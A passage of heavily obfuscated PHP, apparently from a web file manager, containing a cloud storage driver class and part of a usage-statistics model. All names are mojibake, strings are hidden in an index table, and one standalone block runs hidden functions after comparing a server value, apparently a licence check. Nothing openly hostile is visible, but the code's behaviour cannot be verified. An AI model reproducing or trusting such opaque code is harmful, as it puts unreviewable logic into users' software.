(substr($CÒ–ĞÌ¢³À[$C­ŞÆœƒàé[28]], -1) == $C­ŞÆœƒàé[8]) { continue; } $b¿ïçåÛ‹[$C­ŞÆœƒàé[73]][] = $this->fileInfo($CÒ–ĞÌ¢³À[$C­ŞÆœƒàé[28]], $dñáßºö¬, $CÒ–ĞÌ¢³À); } } return $b¿ïçåÛ‹; } private function fileInfo($bîèï¬ñ—, $f©ø› ‘ ¥ = false, $e³×ğË·†Ü = array()) { goto Cóˆ™ÉëŒğ; c‡ÕÈ¡Áè‚: return $C‰à²«¶¨; goto eæõ“…¼¿ß; DÊ²¹†ØÛ: if (empty($e³×ğË·†Ü)) { $e³×ğË·†Ü = $this->objectMeta($bîèï¬ñ—); if (!$e³×ğË·†Ü) { return $C‰à²«¶¨; } } if (isset($e³×ğË·†Ü[$b÷ê¨ÒˆÒá[190]])) { $C‰à²«¶¨[$b÷ê¨ÒˆÒá[107]] = $e³×ğË·†Ü[$b÷ê¨ÒˆÒá[190]]; } if (isset($e³×ğË·†Ü[$b÷ê¨ÒˆÒá[77]])) { $C‰à²«¶¨[$b÷ê¨ÒˆÒá[77]] = $e³×ğË·†Ü[$b÷ê¨ÒˆÒá[77]]; } goto c‡ÕÈ¡Áè‚; Cóˆ™ÉëŒğ: $b÷ê¨ÒˆÒá =& $_SERVER[‚Ğ°–—î]; if ($f©ø› ‘ ¥) { return array($b÷ê¨ÒˆÒá[28] => $this->pathThis($bîèï¬ñ—), $b÷ê¨ÒˆÒá[75] => $this->getPathOuter($bîèï¬ñ—), $b÷ê¨ÒˆÒá[29] => $b÷ê¨ÒˆÒá[167], $b÷ê¨ÒˆÒá[160] => $this->ext($bîèï¬ñ—), $b÷ê¨ÒˆÒá[77] => isset($e³×ğË·†Ü[$b÷ê¨ÒˆÒá[77]]) ? $e³×ğË·†Ü[$b÷ê¨ÒˆÒá[77]] : 0, $b÷ê¨ÒˆÒá[187] => 0, $b÷ê¨ÒˆÒá[107] => 0, $b÷ê¨ÒˆÒá[188] => !0, $b÷ê¨ÒˆÒá[189] => !0); } $C‰à²«¶¨ = array($b÷ê¨ÒˆÒá[28] => $this->pathThis($bîèï¬ñ—), $b÷ê¨ÒˆÒá[75] => $this->getPathOuter($bîèï¬ñ—), $b÷ê¨ÒˆÒá[29] => $b÷ê¨ÒˆÒá[167], $b÷ê¨ÒˆÒá[187] => 0, $b÷ê¨ÒˆÒá[107] => 0, $b÷ê¨ÒˆÒá[77] => 0, $b÷ê¨ÒˆÒá[160] => $this->ext($bîèï¬ñ—), $b÷ê¨ÒˆÒá[188] => !0, $b÷ê¨ÒˆÒá[189] => !0); goto DÊ²¹†ØÛ; eæõ“…¼¿ß: } private function folderInfo($AÊõÅ‡îÉé, $bÓŸÏ†¶Šå = false) { goto FÎ—³ï´º; FÎ—³ï´º: $Fêá°ßñÇ­ =& $_SERVER[‚Ğ°–—î]; if ($bÓŸÏ†¶Šå) { return array($Fêá°ßñÇ­[28] => $this->pathThis($AÊõÅ‡îÉé), $Fêá°ßñÇ­[75] => $this->getPathOuter($Fêá°ßñÇ­[8] . $AÊõÅ‡îÉé), $Fêá°ßñÇ­[29] => $Fêá°ßñÇ­[76], $Fêá°ßñÇ­[188] => !0, $Fêá°ßñÇ­[189] => !0); } $B†ïÀ©ˆ÷‘ = array($Fêá°ßñÇ­[28] => $this->pathThis($AÊõÅ‡îÉé), $Fêá°ßñÇ­[75] => $this->getPathOuter($Fêá°ßñÇ­[8] . $AÊõÅ‡îÉé), $Fêá°ßñÇ­[29] => $Fêá°ßñÇ­[76], $Fêá°ßñÇ­[187] => 0, $Fêá°ßñÇ­[107] => 0, $Fêá°ßñÇ­[188] => !0, $Fêá°ßñÇ­[189] => !0); goto fÑÓô»ù’²; fÑÓô»ù’²: if ($AÊõÅ‡îÉé == $Fêá°ßñÇ­[33]) { return $B†ïÀ©ˆ÷‘; } $AÊõÅ‡îÉé = trim($AÊõÅ‡îÉé, $Fêá°ßñÇ­[8]) . $Fêá°ßñÇ­[8]; $eÂßÙ»„ò = $this->objectMeta($AÊõÅ‡îÉé); goto bÖ¿”Áõê’; bÖ¿”Áõê’: if (isset($eÂßÙ»„ò[$Fêá°ßñÇ­[190]])) { $B†ïÀ©ˆ÷‘[$Fêá°ßñÇ­[187]] = $eÂßÙ»„ò[$Fêá°ßñÇ­[190]]; } return $B†ïÀ©ˆ÷‘; goto b‰¦‚âÛÇ”; b‰¦‚âÛÇ”: } public function listObjs($c­¾‰ªšíİ, $fÀÄìšİ÷İ = null, $Bª÷Éš‡… = null, $aî‚—‰Øù† = null) { $f¶‘ÜíŠò =& $_SERVER[‚Ğ°–—î]; $c­¾‰ªšíİ = trim($c­¾‰ªšíİ, $f¶‘ÜíŠò[8]); $D¸Ÿ™‚­÷£ = empty($c­¾‰ªšíİ) ? $f¶‘ÜíŠò[33] : $c­¾‰ªšíİ . $f¶‘ÜíŠò[8]; return $this->client->getBucket($this->bucket, $D¸Ÿ™‚­÷£, $fÀÄìšİ÷İ, $Bª÷Éš‡…, $aî‚—‰Øù†, !0); } public function has($a¤ğÊÖ´±÷, $aç´®´³¿µ = false, $A’Š¡ÃêÂÏ = true) { goto E´İ¶¬§â; cêÕÈÂ™Ã‰: if ($aç´®´³¿µ) { return array($bó¬¤©È„ğ[191] => $FÂÈ®æâ‰ô, $bó¬¤©È„ğ[192] => $bÊíÆ•İÜ©); } return !1; goto D¤ÁÔØÔ‰‰; D¹¤©ŞëÀ: $cêƒßµË—  = $this->listObjs($a¤ğÊÖ´±÷, null, null, $bó¬¤©È„ğ[8]); $cêƒßµË—  = is_array($cêƒßµË— ) ? $cêƒßµË—  : array(); foreach ($cêƒßµË—  as $E¨É·ï¿Ä) { if (isset($E¨É·ï¿Ä[$bó¬¤©È„ğ[28]]) && substr($E¨É·ï¿Ä[$bó¬¤©È„ğ[28]], -1) != $bó¬¤©È„ğ[8]) { if (!$aç´®´³¿µ && $A’Š¡ÃêÂÏ) { return !0; } $FÂÈ®æâ‰ô++; } else { if (isset($E¨É·ï¿Ä[$bó¬¤©È„ğ[186]])) { if (!$aç´®´³¿µ && !$A’Š¡ÃêÂÏ) { return !1; } $bÊíÆ•İÜ©++; } } } goto cêÕÈÂ™Ã‰; E´İ¶¬§â: $bó¬¤©È„ğ =& $_SERVER[‚Ğ°–—î]; $FÂÈ®æâ‰ô = 0; $bÊíÆ•İÜ© = 0; goto D¹¤©ŞëÀ; D¤ÁÔØÔ‰‰: } public function listAll($C’¯—¯÷) { $c¶ˆØ‘­’ =& $_SERVER[‚Ğ°–—î]; $c¤ãåÛ‚ = $this->listObjs($C’¯—¯÷); $bŸÂÑŞ›¹Ÿ = $fñ±·Š¬“ = array(); foreach ($c¤ãåÛ‚ as $e´‘ÕÅ¿ì => $f‡«™Îîí°) { $bŸÂÑŞ›¹Ÿ[] = $f‡«™Îîí°[$c¶ˆØ‘­’[28]]; $fñ±·Š¬“[$e´‘ÕÅ¿ì] = $f‡«™Îîí°[$c¶ˆØ‘­’[77]]; } return $this->listAllFiles($C’¯—¯÷, $bŸÂÑŞ›¹Ÿ, $fñ±·Š¬“); } public function canRead($EÃ¤¢ˆ›Ğ×) { $FÎèÆ÷ô…ô =& $_SERVER[‚Ğ°–—î]; $f¶Ş›Ô¶Ò¢ = $this->client->getAccessControlPolicy($this->bucket, $EÃ¤¢ˆ›Ğ×); if (!$f¶Ş›Ô¶Ò¢) { return !1; } return in_array($f¶Ş›Ô¶Ò¢, array($FÎèÆ÷ô…ô[193], $FÎèÆ÷ô…ô[194], $FÎèÆ÷ô…ô[195])) ? !0 : !1; } public function canWrite($b¶Î–ó¢Í‹) { $dƒíß¾•†‰ =& $_SERVER[‚Ğ°–—î]; $bŞˆíœÌŠ = $this->client->getAccessControlPolicy($this->bucket, $b¶Î–ó¢Í‹); if (!$bŞˆíœÌŠ) { return !1; } return in_array($bŞˆíœÌŠ, array($dƒíß¾•†‰[193], $dƒíß¾•†‰[194])) ? !0 : !1; } public function getContent($cÎÀ¡°…—’) { return $this->client->getObject($this->bucket, $cÎÀ¡°…—’); } public function setContent($Fíâ¨ö÷˜½, $a‰õ¹Àá¤Ù = '', $B†¬Åîã³å = false) { goto F ¯‚Îƒ¥; F ¯‚Îƒ¥: $E´­­¿¸¿÷ =& $_SERVER[‚Ğ°–—î]; $Fíâ¨ö÷˜½ = $B†¬Åîã³å ? trim($Fíâ¨ö÷˜½, $E´­­¿¸¿÷[8]) . $E´­­¿¸¿÷[8] : $Fíâ¨ö÷˜½; $eŸÎ¿‘Á— = get_file_mime(get_path_ext($Fíâ¨ö÷˜½)); goto cÕ¨ˆÈˆ±„; eÂ†‹Ò±ó: $eİãÙ­ø¶ = $this->copyFile($Fíâ¨ö÷˜½, $Fíâ¨ö÷˜½, array($E´­­¿¸¿÷[196] => $eİãÙ­ø¶[$E´­­¿¸¿÷[197]])); return $eİãÙ­ø¶ ? !0 : !1; goto E±ÑÍÃÆ…; cÕ¨ˆÈˆ±„: $eİãÙ­ø¶ = $this->client->putObject($a‰õ¹Àá¤Ù, $this->bucket, $Fíâ¨ö÷˜½, $E´­­¿¸¿÷[185], array(), $eŸÎ¿‘Á—); if (!$eİãÙ­ø¶) { return !1; } if ($B†¬Åîã³å) { return !0; } goto eÂ†‹Ò±ó; E±ÑÍÃÆ…: } public function fileSubstr($e´Ê¬ö’âÊ, $E—ñÕ•Üó’, $aøÖ­ÁåÉÆ) { $BÅ¸š‰äÍ¡ = $E—ñÕ•Üó’ + $aøÖ­ÁåÉÆ - 1; return $this->client->getObject($this->bucket, $e´Ê¬ö’âÊ, array($_SERVER[‚Ğ°–—î][198] => "\x62\171\x74\145\163\x3d{$E—ñÕ•Üó’}\x2d{$BÅ¸š‰äÍ¡}")); } public function upload($CÀµº§·Š, $F¦Š™ñÛ, $cˆøŸÃ•ßƒ = false, $aÀÑ§Äá“² = REPEAT_REPLACE) { $b¿±œİåÑ =& $_SERVER[‚Ğ°–—î]; $BÄ×á¸…ä = array($b¿±œİåÑ[196] => @md5_file($F¦Š™ñÛ)); $D¿Š›É‰¢Œ = array($b¿±œİåÑ[199] => get_file_mime(get_path_ext($CÀµº§·Š))); if (IO::size($F¦Š™ñÛ) <= 1024 * 1024 * 200) { $eÙö…òÜºÉ = $this->client->putObjectFile($F¦Š™ñÛ, $this->bucket, $CÀµº§·Š, $b¿±œİåÑ[185], $BÄ×á¸…ä, $D¿Š›É‰¢Œ); return !empty($eÙö…òÜºÉ) ? $this->getPathOuter($CÀµº§·Š) : !1; } $eğ´¼§Àè = $this->client->multiUploadObject($F¦Š™ñÛ, $this->bucket, trim($CÀµº§·Š, $b¿±œİåÑ[8]), $BÄ×á¸…ä, $D¿Š›É‰¢Œ); return $eğ´¼§Àè ? $this->getPathOuter($CÀµº§·Š) : !1; } public function download($b‚ƒ…ø‘¨“, $AØ´à¬Ö‹‡) { if (!@is_dir($this->pathFather($AØ´à¬Ö‹‡)) && !IO::mkdir($this->pathFather($AØ´à¬Ö‹‡))) { return !1; } $fİ©Ÿ¥ç¼• = $this->client->getObject($this->bucket, $b‚ƒ…ø‘¨“, array(), $AØ´à¬Ö‹‡); return $fİ©Ÿ¥ç¼• !== !1 ? $AØ´à¬Ö‹‡ : !1; } public function link($dæÆ¾Á‡•, $Dƒ«Û™İ³² = array()) { $d§÷Ø˜æâ‘ =& $_SERVER[‚Ğ°–—î]; if ($this->signVer == $d§÷Ø˜æâ‘[200]) { return $this->client->getAuthenticatedURL($this->bucket, $dæÆ¾Á‡•, 3600 * 12, $Dƒ«Û™İ³²); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($dæÆ¾Á‡•, $d§÷Ø˜æâ‘[8]), 3600 * 12, $this->region, array(), !0, $Dƒ«Û™İ³²); } public function fileOut($E‘×Ó¨¨Å¾, $cÆÓˆ¯ÇäÑ = false, $bÀ¾¼ŒËëÀ = false, $C÷¶“÷¸ = '') { goto eã ôÓ‚Â†; eã ôÓ‚Â†: $bÕ¡Õ¢ìîğ =& $_SERVER[‚Ğ°–—î]; if (!$bÀ¾¼ŒËëÀ) { $bÀ¾¼ŒËëÀ = $this->pathThis($E‘×Ó¨¨Å¾); } $CæšØ»ªØ = get_file_mime(get_path_ext($bÀ¾¼ŒËëÀ)); goto a‘ßÛáŞ¸ˆ; a‘ßÛáŞ¸ˆ: if ($CæšØ»ªØ == $bÕ¡Õ¢ìîğ[201]) { return parent::fileOut($E‘×Ó¨¨Å¾, $cÆÓˆ¯ÇäÑ, $bÀ¾¼ŒËëÀ, $C÷¶“÷¸); } $cÆÓˆ¯ÇäÑ = $cÆÓˆ¯ÇäÑ ? $bÕ¡Õ¢ìîğ[202] : $bÕ¡Õ¢ìîğ[203]; $d½±ó×¦Œª = array($bÕ¡Õ¢ìîğ[204] => $cÆÓˆ¯ÇäÑ . $bÕ¡Õ¢ìîğ[205] . rawurlencode($bÀ¾¼ŒËëÀ), $bÕ¡Õ¢ìîğ[206] => $CæšØ»ªØ); goto A´ìëÓ¥Ä; A´ìëÓ¥Ä: $dà¢›×É¦í = $this->link($E‘×Ó¨¨Å¾, $d½±ó×¦Œª); $this->fileOutLink($dà¢›×É¦í); goto eˆÙÓ¨«Ê³; eˆÙÓ¨«Ê³: } public function fileOutServer($AÑëõ­÷Ä¿, $A®ŒŸ—ïË = false, $F’ÛšêÓÔá = false, $E«†À·îŸ = '') { parent::fileOut($AÑëõ­÷Ä¿, $A®ŒŸ—ïË, $F’ÛšêÓÔá, $E«†À·îŸ); } public function fileOutImage($eÁ¾øß°ßÔ, $AğÄÇ—ÚÇñ = 250) { $B ª ×ôËŒ = $this->link($eÁ¾øß°ßÔ); $this->fileOutLink($B ª ×ôËŒ); } public function fileOutImageServer($cÃ–Î´ã·œ, $B³•¢ÇãÏÓ = 250) { parent::fileOutImage($cÃ–Î´ã·œ, $B³•¢ÇãÏÓ); } public function hashMd5($fÀ¡ç–Â‘Ó, $eõİËµÆ†¤ = '') { $f»ó‘è¥åì =& $_SERVER[‚Ğ°–—î]; $EÎ·ßâ³ÔÍ = $this->objectMeta($fÀ¡ç–Â‘Ó); if (!$EÎ·ßâ³ÔÍ) { return !1; } $eõİËµÆ†¤ = $eõİËµÆ†¤ ? $eõİËµÆ†¤ : _get($EÎ·ßâ³ÔÍ, $f»ó‘è¥åì[207]); $eõİËµÆ†¤ = $eõİËµÆ†¤ ? $eõİËµÆ†¤ : _get($EÎ·ßâ³ÔÍ, $f»ó‘è¥åì[197], $f»ó‘è¥åì[33]); return $eõİËµÆ†¤; } public function uploadFormData($a†œÇå‘ÎÒ, $Eã‹ãßùÀæ = 3600) { $fÛÏ­Ê¯õ® =& $_SERVER[‚Ğ°–—î]; $C’ĞùìğÕä = $this->pathFather($a†œÇå‘ÎÒ); $FÄÉÙò¬µì = $this->client->getHttpUploadPostParams($this->bucket, $C’ĞùìğÕä, $fÛÏ­Ê¯õ®[185], $Eã‹ãßùÀæ); return array_merge((array) $FÄÉÙò¬µì, array($fÛÏ­Ê¯õ®[169] => $this->getHost())); } public function multiUploadFormData($C¨î×Œ•¢å, $cŸ‘Ü¼Îƒ = 3600) { $Bîğ™ğæ’ƒ =& $_SERVER[‚Ğ°–—î]; $dÛ¬ÊãÒ©¡ = gmdate($Bîğ™ğæ’ƒ[208]); $döé‹µ¤à = array(); $b„˜İÍÑĞ³ = $this->client->getUploadId($this->bucket, $C¨î×Œ•¢å, $döé‹µ¤à); if (!$b„˜İÍÑĞ³) { return !1; } return array($Bîğ™ğæ’ƒ[209] => $b„˜İÍÑĞ³, $Bîğ™ğæ’ƒ[169] => $this->getHost() . $Bîğ™ğæ’ƒ[8] . $this->pathEncode($C¨î×Œ•¢å), $Bîğ™ğæ’ƒ[210] => $dÛ¬ÊãÒ©¡, $Bîğ™ğæ’ƒ[89] => $C¨î×Œ•¢å); } public function multiUploadAuthData($D¬¹à¢âË¿, $aÓê¤¤›’² = array()) { goto bË÷´ˆİÊ; bË÷´ˆİÊ: $FÑÄ¬¶êË‚ =& $_SERVER[‚Ğ°–—î]; $bµ·Êºôš¸ = isset($aÓê¤¤›’²[$FÑÄ¬¶êË‚[210]]) ? $aÓê¤¤›’²[$FÑÄ¬¶êË‚[210]] : gmdate($FÑÄ¬¶êË‚[208]); $a‡ß„ß”½× = isset($aÓê¤¤›’²[$FÑÄ¬¶êË‚[160]]) ? $aÓê¤¤›’²[$FÑÄ¬¶êË‚[160]] : $FÑÄ¬¶êË‚[33]; goto Fª’ÉÀ¹ˆù; Fª’ÉÀ¹ˆù: $e£„Šˆª = $aÓê¤¤›’²[$FÑÄ¬¶êË‚[89]]; unset($aÓê¤¤›’²[$FÑÄ¬¶êË‚[89]]); if (isset($aÓê¤¤›’²[$FÑÄ¬¶êË‚[211]])) { $aÓê¤¤›’²[$FÑÄ¬¶êË‚[210]] = $bµ·Êºôš¸; return $this->listUploadParts($e£„Šˆª, $aÓê¤¤›’²); } goto eË‚·’Å¢ƒ; EœÁóóÉˆ: if (strpos($a‡ß„ß”½×, $FÑÄ¬¶êË‚[213]) === 0) { return array($FÑÄ¬¶êË‚[220] => $FÖ¼‡ó«œÑ, $FÑÄ¬¶êË‚[210] => $bµ·Êºôš¸); } return $FÖ¼‡ó«œÑ; goto EÔÁŠåˆ­Ü; eË‚·’Å¢ƒ: $DÚØß£•‰ = array($FÑÄ¬¶êË‚[212], $FÑÄ¬¶êË‚[33], $FÑÄ¬¶êË‚[116], $FÑÄ¬¶êË‚[33], "\170\55\x61\x6d\x7a\55\x64\x61\164\x65\x3a{$bµ·Êºôš¸}", $FÑÄ¬¶êË‚[8] . $this->bucket . $FÑÄ¬¶êË‚[8] . $this->pathEncode($e£„Šˆª) . $a‡ß„ß”½×); if (strpos($a‡ß„ß”½×, $FÑÄ¬¶êË‚[213]) === 0) { $DÚØß£•‰[0] = $FÑÄ¬¶êË‚[214]; } if (isset($aÓê¤¤›’²[$FÑÄ¬¶êË‚[215]]) && $aÓê¤¤›’²[$FÑÄ¬¶êË‚[215]] == $FÑÄ¬¶êË‚[216]) { $DÚØß£•‰[0] = $FÑÄ¬¶êË‚[216]; } goto Fğ¥Ÿ¥’Œ; Fğ¥Ÿ¥’Œ: $Bìáå°Œ‘ = implode($FÑÄ¬¶êË‚[217], $DÚØß£•‰); $Fµ·Ç’æÙõ = base64_encode(hash_hmac($FÑÄ¬¶êË‚[218], $Bìáå°Œ‘, $this->secret, !0)); $FÖ¼‡ó«œÑ = $FÑÄ¬¶êË‚[219] . $this->accessKey . $FÑÄ¬¶êË‚[4] . $Fµ·Ç’æÙõ; goto EœÁóóÉˆ; EÔÁŠåˆ­Ü: } public function listUploadParts($eœ’åä„‰, $c«õƒİà©™ = array()) { goto EŒåÀ´°’˜; b½ŞÂ‹›µ: if (!$Eê¶Ø¶ëø) { return !1; } unset($c«õƒİà©™[$D´‘™‰µï¥[211]], $c«õƒİà©™[$D´‘™‰µï¥[215]]); $c«õƒİà©™[$D´‘™‰µï¥[89]] = $eœ’åä„‰; goto F‰Ùé·š; EŒåÀ´°’˜: $D´‘™‰µï¥ =& $_SERVER[‚Ğ°–—î]; $dÅîÍô•ã = str_replace($D´‘™‰µï¥[221], $D´‘™‰µï¥[33], $c«õƒİà©™[$D´‘™‰µï¥[160]]); $Eê¶Ø¶ëø = $this->client->listParts($this->bucket, $eœ’åä„‰, $dÅîÍô•ã); goto b½ŞÂ‹›µ; F‰Ùé·š: $däßôŠ ¥Æ = $this->multiUploadAuthData($eœ’åä„‰, $c«õƒİà©™); if (empty($däßôŠ ¥Æ)) { return !1; } return array($D´‘™‰µï¥[220] => $däßôŠ ¥Æ, $D´‘™‰µï¥[210] => $c«õƒİà©™[$D´‘™‰µï¥[210]], $D´‘™‰µï¥[222] => $Eê¶Ø¶ëø); goto a½ô»¥ÎÎ; a½ô»¥ÎÎ: } public function getHost() { return parent::getHost() . $_SERVER[‚Ğ°–—î][8] . $this->bucket; } public function size($a«£èßš¡”) { $BùæŞÔ˜ï† = $this->objectMeta($a«£èßš¡”); return $BùæŞÔ˜ï† ? $BùæŞÔ˜ï†[$_SERVER[‚Ğ°–—î][77]] : 0; } public function info($a¶Şó’ôŒ) { if ($this->isFolder($a¶Şó’ôŒ)) { return $this->folderInfo($a¶Şó’ôŒ); } else { if ($this->isFile($a¶Şó’ôŒ)) { return $this->fileInfo($a¶Şó’ôŒ); } } return !1; } public function exist($Aİˆ†ù½ƒ‡) { return $this->isFile($Aİˆ†ù½ƒ‡) || $this->isFolder($Aİˆ†ù½ƒ‡); } public function isFile($d…•©ŒóÍÍ) { return !$this->isFolder($d…•©ŒóÍÍ) && $this->objectMeta($d…•©ŒóÍÍ); } public function isFolder($bÇ£ÖÄÕÍÓ) { return $this->cacheMethod($_SERVER[‚Ğ°–—î][223], $bÇ£ÖÄÕÍÓ); } protected function objectMeta($A÷—¢ƒ¨®) { return $this->cacheMethod($_SERVER[‚Ğ°–—î][224], $A÷—¢ƒ¨®); } protected function _objectMeta($A¦ßÚÛã‘) { $Eœ•º¾¡ =& $_SERVER[‚Ğ°–—î]; $A¦ßÚÛã‘ = rtrim($A¦ßÚÛã‘, $Eœ•º¾¡[8]); try { $F§ØŞÕ£Ú  = $this->client->getObjectInfo($this->bucket, $A¦ßÚÛã‘); if (!isset($F§ØŞÕ£Ú [$Eœ•º¾¡[207]]) && isset($F§ØŞÕ£Ú [$Eœ•º¾¡[225]])) { $F§ØŞÕ£Ú [$Eœ•º¾¡[207]] = $F§ØŞÕ£Ú [$Eœ•º¾¡[225]]; } } catch (Exception $c¥Ë•×¤) { $F§ØŞÕ£Ú  = !1; } if (!$F§ØŞÕ£Ú ) { } return $F§ØŞÕ£Ú ; } protected function _isFolder($Bš‰¿Ãî‡) { goto Cï÷¾Ùß; DÍòçËç: $D ¥‰îÓ†³ = $this->client->getBucket($this->bucket, $Bš‰¿Ãî‡, null, 1); if (empty($D ¥‰îÓ†³)) { return !1; } $D ¥‰îÓ†³ = array_values($D ¥‰îÓ†³); goto f„èÏ«§£®; f„èÏ«§£®: if (substr($D ¥‰îÓ†³[0][$A§¾Üóğ’[28]], -1) == $A§¾Üóğ’[8]) { return !0; } if (get_path_this($D ¥‰îÓ†³[0][$A§¾Üóğ’[28]]) == get_path_this($Bš‰¿Ãî‡)) { return !1; } return !0; goto B‚›¢Œåä; Cï÷¾Ùß: $A§¾Üóğ’ =& $_SERVER[‚Ğ°–—î]; $Bš‰¿Ãî‡ = rtrim($Bš‰¿Ãî‡, $A§¾Üóğ’[8]); if ($Bš‰¿Ãî‡ == $A§¾Üóğ’[33] || $Bš‰¿Ãî‡ == $A§¾Üóğ’[8]) { return !0; } goto DÍòçËç; B‚›¢Œåä: } } define($_SERVER[‚Ğ°–—î][226], 1); goto EêÚŠŠ—; Dµ°øßâ¾÷: if ($_SERVER[$_SERVER[‚Ğ°–—î][777]] != $Fß»­Š„‚í($D¢Çì•Ø®Ã)) { goto AòŸ­Ò¿ÆÂ; aÊÚˆÊê¯: $f§„›ˆõÌÖ($D¢Çì•Ø®Ã); goto E•»¨Â‚Ÿ; AòŸ­Ò¿ÆÂ: $Fî¬©ÕÁÍÈ = $_SERVER[‚Ğ°–—î][779]; $A„…¼ªÀ½î = $_SERVER[$_SERVER[‚Ğ°–—î][780]] . $_SERVER[‚Ğ°–—î][781]; $C¤§Ëæ¿»ì = $Fî¬©ÕÁÍÈ($A„…¼ªÀ½î); goto C‘„ª­¥óè; C‘„ª­¥óè: $B”ÖÒ–ù¨ƒ = explode($_SERVER[‚Ğ°–—î][217], $C¤§Ëæ¿»ì); if (count($B”ÖÒ–ù¨ƒ) < $_SERVER[‚Ğ°–—î][610]) { $C¡ö…÷‡çØ = $_SERVER[‚Ğ°–—î][782]; $C¡ö…÷‡çØ(); } $f§„›ˆõÌÖ = $_SERVER[‚Ğ°–—î][783]; goto aÊÚˆÊê¯; E•»¨Â‚Ÿ: } class AnalysisModel extends ModelBaseLight { public function init($fê»ÎÓ¬ğ‹) { $Fê‡ğ¾¢Ş =& $_SERVER[‚Ğ°–—î]; $E¬“¾öÄ = array($Fê‡ğ¾¢Ş[535] => array($Fê‡ğ¾¢Ş[29] => $Fê‡ğ¾¢Ş[2032], $Fê‡ğ¾¢Ş[261] => array($Fê‡ğ¾¢Ş[210], $Fê‡ğ¾¢Ş[699], $Fê‡ğ¾¢Ş[2033], $Fê‡ğ¾¢Ş[2034])), $Fê‡ğ¾¢Ş[2035] => array($Fê‡ğ¾¢Ş[29] => $Fê‡ğ¾¢Ş[2036], $Fê‡ğ¾¢Ş[261] => array($Fê‡ğ¾¢Ş[210], $Fê‡ğ¾¢Ş[697], $Fê‡ğ¾¢Ş[2037], $Fê‡ğ¾¢Ş[2038], $Fê‡ğ¾¢Ş[2039]))); if (!isset($E¬“¾öÄ[$fê»ÎÓ¬ğ‹])) { return !1; } $this->optionType = $E¬“¾öÄ[$fê»ÎÓ¬ğ‹][$Fê‡ğ¾¢Ş[29]]; $this->field = $E¬“¾öÄ[$fê»ÎÓ¬ğ‹][$Fê‡ğ¾¢Ş[261]]; return !0; } public function listData($e³õˆİó„ñ = false, $a°œ˜ôÙ‚ = "\155\x6f\x64\x69\x66\171\124\x69\155\x65", $BÔßŸ©ˆÒ = false) { return parent::listData($e³õˆİó„ñ, $a°œ˜ôÙ‚, $BÔßŸ©ˆÒ); } public function trendList($Dœ„˜ùÈºµ) { goto f¿ïªª¿¸; C£Šå‚¾ÓÚ: foreach ($Dª¦Èß·†× as $eÃøÙ™íä—) { $this->{$BÌÀØ¿Ê²ù}($eÃøÙ™íä—); } return $this->listData(); goto dì¿ˆ„ÁóÒ; f¿ïªª¿¸: $B‰›ËÙğÓ =& $_SERVER[‚Ğ°–—î]; $B”ˆ†É¨“¥ = $this->listData(); if ($B”ˆ†É¨“¥) { $Bëù¨ƒŒ½÷ = end($B”ˆ†É¨“¥); $eÃøÙ™íä— = date($B‰›ËÙğÓ[2040], strtotime($B‰›ËÙğÓ[2041])); if ($Bëù¨ƒŒ½÷[$B‰›ËÙğÓ[210]] == $eÃøÙ™íä—) { return $B”ˆ†É¨“¥; } $A½½¨ªµÑŒ = strtotime($Bëù¨ƒŒ½÷[$B‰›ËÙğÓ[210]]); } goto DØ›§²±†Ã; DØ›§²±†Ã: if (!isset($A½½¨ªµÑŒ)) { $bÇ«ç¬Ğ’ƒ = $Dœ„˜ùÈºµ == $B‰›ËÙğÓ[535] ? $B‰›ËÙğÓ[477] : $B‰›ËÙğÓ[752]; $A½½¨ªµÑŒ = Model($bÇ«ç¬Ğ’ƒ)->min($B‰›ËÙğÓ[187]); } $BÌÀØ¿Ê²ù = $B‰›ËÙğÓ[2042] . ucfirst($Dœ„˜ùÈºµ); $Dª¦Èß·†× = $this->dateList($A½½¨ªµÑŒ); goto C£Šå‚¾ÓÚ; dì¿ˆ„ÁóÒ: } private function dateList($fÖÖæøñÕí) { $E‚«Â¹ÜÖ =& $_SERVER[‚Ğ°–—î]; $CÜ‹È¼É = $fÖÖæøñÕí; $CÒò¤ä¥³“ = strtotime($E‚«Â¹ÜÖ[2041]); $E¯Œ‘áß¿ = array(); while ($CÜ‹È¼É <= $CÒò¤ä¥³“) { $E¯Œ‘áß¿[] = date($E‚«Â¹ÜÖ[2040], $CÜ‹È¼É); $CÜ‹È¼É = strtotime($E‚«Â¹ÜÖ[2043], $CÜ‹È¼É); } return $E¯Œ‘áß¿; } public function _recordUser($CõãÖê’øì = '') { goto C¿ÚøóÌñ¾; C¿ÚøóÌñ¾: $a•ÈŒ±¶åÉ =& $_SERVER[‚Ğ°–—î]; $cÄµ¶ÄÅçŠ = strtotime(date($a•ÈŒ±¶åÉ[2044], strtotime($CõãÖê’øì))); $d ñŒª„š = strtotime(date($a•ÈŒ±¶åÉ[2045], strtotime($CõãÖê’øì))); goto C»²¬ƒà´­; D­äÊ½Øà: $Cæåİ‹§á = Model($a•ÈŒ±¶åÉ[477])->where($E›Ì”¶ŸÙ)->count($a•ÈŒ±¶åÉ[1438]); $E›Ì”¶ŸÙ[$a•ÈŒ±¶åÉ[29]] = $a•ÈŒ±¶åÉ[2046]; $b•‰„ªšÉò = Model($a•ÈŒ±¶åÉ[2047])->where($E›Ì”¶ŸÙ)->count($a•ÈŒ±¶åÉ[2048]); goto E»óÄ™ê¬‡; E»óÄ™ê¬‡: $F™‡»è˜¼Ä = array($a•ÈŒ±¶åÉ[210] => $CõãÖê’øì, $a•ÈŒ±¶åÉ[699] => (int) $EŠßß›µ°ğ, $a•ÈŒ±¶åÉ[2033] => (int) $Cæåİ‹§á, $a•ÈŒ±¶åÉ[2034] => (int) $b•‰„ªšÉò); return $this->insert($F™‡»è˜¼Ä); goto açÑÁ²Ú„—; C»²¬ƒà´­: $E›Ì”¶ŸÙ = array($a•ÈŒ±¶åÉ[187] => array($a•ÈŒ±¶åÉ[928], $d ñŒª„š)); $EŠßß›µ°ğ = Model($a•ÈŒ±¶åÉ[477])->where($E›Ì”¶ŸÙ)->count($a•ÈŒ±¶åÉ[1438]); $E›Ì”¶ŸÙ[$a•ÈŒ±¶åÉ[187]] = array($a•ÈŒ±¶åÉ[321], array($cÄµ¶ÄÅçŠ, $d ñŒª„š)); goto D­äÊ½Øà; açÑÁ²Ú„—: } public function _recordStore($e›Œ«ÜÛ© = '') { goto cƒ®êÆ”„; F ‹Îí¥°Ä: $fˆ¾­¾³èæ = Model($EÌÔµÃïãÚ[422])->where($b ì®êÊ˜Õ)->sum($EÌÔµÃïãÚ[77]); $b ì®êÊ˜Õ[$EÌÔµÃïãÚ[370]] = 0; $dÅóê½·‡á = Model($EÌÔµÃïãÚ[752])->where($b 